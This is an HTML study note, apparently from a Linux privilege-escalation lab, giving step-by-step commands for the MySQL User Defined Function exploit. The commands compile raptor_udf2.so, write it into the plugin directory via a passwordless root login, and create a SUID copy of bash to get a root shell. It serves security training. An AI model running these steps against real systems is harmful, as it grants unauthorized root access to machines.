<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>Services</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>Services</h1><br/><br />             The MySQL service is running as root and the &quot;root&quot; user for the service does not have a password assigned. We can use a <a href="https://www.exploit-db.com/exploits/1518">popular exploit</a> that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.<br />Change into the /home/user/tools/mysql-udf directory:<br /><code>cd /home/user/tools/mysql-udf</code><br />Compile the raptor_udf2.c exploit code using the following commands:<br /><code>gcc -g -c raptor_udf2.c -fPIC<br />gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc<br /></code><br />Connect to the MySQL service as the root user with a blank password:<br /><code>mysql -u root</code><br /><br />Execute  the following commands on the MySQL shell to create a User Defined  Function (UDF) &quot;do_system&quot; using our compiled exploit:<br /><code><span style="color:#00ff00;">use mysql;</span></code><code><br /></code><code><span style="color:#00ff00;">create table foo(line blob);</span></code><code><br /></code><code><span style="color:#00ff00;">insert into foo values(load_file(&#39;/home/user/tools/mysql-udf/raptor_udf2.so&#39;));</span></code><code><br /></code><code><span style="color:#00ff00;">select * from foo into dumpfile &#39;/usr/lib/mysql/plugin/raptor_udf2.so&#39;;</span></code><code><br /></code><code><span style="color:#00ff00;">create function do_system returns integer soname &#39;raptor_udf2.so&#39;;</span></code><br /><br />Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:<br /><code>select do_system(&#39;cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash&#39;);</code><br />Exit out of the MySQL shell (type <strong>exit</strong> or <strong>\q</strong> and press <strong>Enter</strong>) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:<br /><code>/tmp/rootbash -p</code><br /><strong>Remember  to remove the /tmp/rootbash executable and exit out of the root shell  before continuing as you will create this file again later in the room!</strong><br /><code>rm /tmp/rootbash<br />exit</code><br /><br />        <br /></div></body></html>